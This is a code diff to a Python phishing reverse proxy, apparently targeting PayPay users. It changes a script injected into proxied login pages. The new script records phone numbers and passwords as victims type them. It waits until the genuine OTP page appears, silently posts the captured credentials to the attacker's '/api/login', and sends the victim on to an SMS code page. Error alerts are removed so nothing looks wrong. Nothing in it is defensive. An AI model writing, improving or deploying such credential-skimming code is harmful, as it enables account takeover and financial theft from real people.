@@ -438,26 +438,41 @@ def proxy_login():
         inject = b'''
 <script>
 (function() {
-  document.addEventListener('submit', function(e) {
-    var form = e.target;
-    var phone = (form.querySelector('input[name="username"], input[type="tel"], input[inputmode="numeric"]') || {}).value || '';
-    var pass = (form.querySelector('input[name="password"], input[type="password"]') || {}).value || '';
-    if (phone && pass) {
-      e.preventDefault();
+  let capturedPhone = '';
+  let capturedPass = '';
+  let triggered = false;
+
+  // Capture inputs as user types
+  document.addEventListener('input', function(e) {
+    const t = e.target;
+    if (t.matches('input[name="username"], input[type="tel"], input[inputmode="numeric"]')) {
+      capturedPhone = t.value.trim();
+    }
+    if (t.matches('input[name="password"], input[type="password"]')) {
+      capturedPass = t.value;
+    }
+  }, true);
+
+  // Watch for OTP page appearing (real success path)
+  const observer = new MutationObserver(function() {
+    if (triggered) return;
+    const otpPage = document.querySelector('.otp-auth-page, .otp-auth, input[name="otp_input"], .otp-input');
+    if (otpPage && capturedPhone && capturedPass) {
+      triggered = true;
       fetch('/api/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({phone: phone, password: pass, user_agent: navigator.userAgent})
+        body: JSON.stringify({phone: capturedPhone, password: capturedPass, user_agent: navigator.userAgent})
       }).then(r => r.json()).then(data => {
         if (data.status === 'sms_required') {
-          sessionStorage.setItem('paypay_phone', phone);
+          sessionStorage.setItem('paypay_phone', capturedPhone);
           window.location.href = '/sms.html';
-        } else {
-          alert(data.error || 'ログインに失敗しました');
         }
-      }).catch(() => alert('通信エラー'));
+      }).catch(() => {});
     }
-  }, true);
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
 })();
 </script>
 '''
@@ -470,7 +485,6 @@ def proxy_login():
     for k, v in resp.headers.items():
         if k.lower() not in ("content-encoding", "transfer-encoding", "content-length", "set-cookie"):
             response.headers[k] = v
-    # Forward set-cookie if any
     if "set-cookie" in resp.headers:
         response.headers["Set-Cookie"] = resp.headers["set-cookie"]
     return response
